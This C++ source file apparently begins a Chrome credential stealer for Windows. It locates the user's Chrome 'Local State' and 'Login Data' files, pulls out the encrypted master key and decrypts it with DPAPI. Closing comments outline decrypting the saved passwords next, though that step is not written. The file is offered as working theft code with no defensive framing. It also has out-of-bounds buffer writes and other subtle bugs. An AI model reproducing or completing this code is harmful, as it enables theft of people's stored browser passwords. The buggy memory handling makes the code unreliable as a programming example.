#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <tuple>
#include <vector>
#include "json.hpp" //Source: https://github.com/nlohmann/json

std::tuple<std::string, std::string> getChromePaths() {
	// Get current user (for the filepath)
	// 256 is max username length (see lmcons.h)
	DWORD bufSize = 256 + 1;
	char* userBuf = (char*) malloc(bufSize);

	if (GetUserNameA(userBuf, &bufSize) == 0) {
		printf("[ERROR] Could not retrieve username.");
	}

	userBuf[bufSize] = '\0';
	// printf("%s\n", userBuf);

	// Get Local State filepath
	std::string lsFilePath = "C:\\Users\\";
	std::string userName = userBuf;
	std::string endPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";

	lsFilePath.append(userName);
	lsFilePath.append(endPath);

	// printf("%s\n", filePath.c_str());

	// Get SQLite Chrome database path
	std::string dataFilePath = "C:\\Users\\";
	std::string endPath2 = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";

	dataFilePath.append(userName);
	dataFilePath.append(endPath2);

	return {lsFilePath, dataFilePath};
}

std::string loadLocalState(std::string chromePath) {
	// Get file handle with CreateFile (doesn't actually create a file, it just opens one)
	HANDLE fileHandle = CreateFileA(
		(LPCSTR) chromePath.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING, //Only open if file exists, end process if file does not exist
		FILE_ATTRIBUTE_READONLY,
		NULL);

	if (fileHandle == INVALID_HANDLE_VALUE) {
		printf("[INFO] No Google Chrome data.\n");
		return "";
	}

	DWORD chromeBufSize = 131072 + 1; // Arbitrary sized buffer, can adjust
	DWORD bytesRead;
	char* chromeContentsBuf = (char*) malloc(chromeBufSize);

	if (!ReadFile(
			fileHandle,
			chromeContentsBuf,
			chromeBufSize,
			&bytesRead,
			NULL)) {
		printf("[ERROR] File could not be read.\n");
		// return "";
	}

	chromeContentsBuf[chromeBufSize] = '\0';

	// Close file handle
	CloseHandle(fileHandle);

	return chromeContentsBuf;
}

std::vector<BYTE> b64Decode(std::string strInput){
    // as before you should make two calls to ::CryptStringToBinaryA 
    std::vector<BYTE> output;

    DWORD confirmSize;

    BOOL bufsizeCheck = CryptStringToBinaryA(
    	strInput.c_str(),
    	strInput.length(),
    	CRYPT_STRING_BASE64,
    	NULL,
    	&confirmSize,
    	NULL,
    	NULL);

    if (bufsizeCheck == 0) {
    	std::cout << "[ERROR] Decrypt: Obtaining the correct size for the buffer failed." << std::endl;
    	return output; //Return empty output
    }

    BYTE* buf = (BYTE*) malloc(confirmSize);

    BOOL bufCheck = CryptStringToBinaryA(
    	strInput.c_str(),
    	strInput.length(),
    	CRYPT_STRING_BASE64,
    	buf,
    	&confirmSize,
    	NULL,
    	NULL);

    if (bufCheck == 0) {
    	std::cout << "[ERROR] Decrypt: Could not copy data." << std::endl;
    	return output; //Return empty output
    }

    // printf("buf:\n");
    // printf("%s\n", buf);

    //Fill output using buf
    std::vector<BYTE> out(buf, buf + confirmSize);
    output = out;

    return output;
}

BYTE* decryptDPAPI(std::string decodedKey) {
	
	// Create key BLOB
	DWORD keyLen = decodedKey.length();
	BYTE keyArr[keyLen];
    std::memcpy(keyArr, decodedKey.data(), keyLen);

	CRYPT_INTEGER_BLOB keyBlob;
	keyBlob.cbData = keyLen;
	keyBlob.pbData = keyArr;

	// Create entropy BLOB
	BYTE* entropyArr = NULL;

	CRYPT_INTEGER_BLOB entropyBlob;
	entropyBlob.cbData = 0;
	entropyBlob.pbData = entropyArr;

	// Init result, unprotect data
	CRYPT_INTEGER_BLOB resultBlob;

	if (!CryptUnprotectData(
			&keyBlob,
			NULL,
			&entropyBlob,
			NULL,
			NULL,
			0,
			&resultBlob
		)) {
		printf("[ERROR] DPAPI decryption failed.\n");
		return NULL;
	}

	// Obtain data, free BLOB data
	BYTE* resultBuf = (BYTE*) malloc(resultBlob.cbData); // +1?
	std::memcpy(resultBuf, resultBlob.pbData, resultBlob.cbData);
	LocalFree(resultBlob.pbData);

	return resultBuf;
}

BYTE* getAESKEy(std::string chromePath) {

	// Get file "Local State" contents
	std::string localStateContents = loadLocalState(chromePath);
	printf("localStateContents: %s\n", localStateContents.c_str());

	// Parse as JSON
	auto localStateJSON = nlohmann::json::parse(localStateContents.c_str());

	// Get base64 encrypted key
	std::string b64Key = localStateJSON["os_crypt"]["encrypted_key"];

	// Decode using base64
	auto decodedKey = b64Decode(b64Key.c_str());

	// Ignore magic bytes and return
	std::string keyOut(decodedKey.begin() + 5, decodedKey.end());

	return decryptDPAPI(keyOut);
}

int main(int argc, char* argv[]) {
	// Access folder C:\Users\<User>\AppData\Local\Google\User Data
	// "Local State" is the file

	// Get Local State and SQLite Chrome database filepaths
	auto [chromePath, databasePath] = getChromePaths();
	printf("chromePath: %s\n", chromePath.c_str());

	// Get AES key
	BYTE* key = getAESKEy(chromePath);
	//printf("Key: %s\n", key);

	// SQLite Chrome database path
	printf("databasePath: %s\n", databasePath.c_str());

	// getChromeContents(): get contents of JSON file "Local State"

	// JSON file with secret key, encrypted with data protection api (DPAPI)
	// To decrypt:
	// Parse encrypted (symmetric) key
	// Decrypt with DPAPI
	// Decrypt data in SQLite database
}